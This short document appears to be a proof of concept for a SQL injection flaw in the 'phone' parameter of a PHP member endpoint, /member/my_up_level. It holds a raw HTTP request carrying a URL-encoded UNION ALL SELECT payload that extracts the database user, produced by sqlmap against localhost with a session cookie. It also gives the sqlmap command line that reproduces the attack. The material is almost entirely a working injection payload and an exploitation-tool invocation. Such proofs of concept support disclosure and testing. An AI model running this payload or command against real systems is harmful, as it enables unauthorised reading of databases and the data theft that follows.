```

GET /member/my_up_level?phone=%27%29%29%20UNION%20ALL%20SELECT%20CONCAT%28IFNULL%28CAST%28CURRENT_USER%28%29%20AS%20NCHAR%29%2C0x20%29%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20- HTTP/1.1
Cache-Control: no-cache
Cookie: PHPSESSID=6qc94pq3rvpu490r1doentg66a
User-Agent: sqlmap/1.8.2.1#dev (https://sqlmap.org)
Host: 127.0.0.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
```

```
python sqlmap.py -u "http://127.0.0.1/member/my_up_level?phone=*" --level=3 --dbms=mysql --cookie "PHPSESSID=6qc94pq3rvpu490r1doentg66a"
```

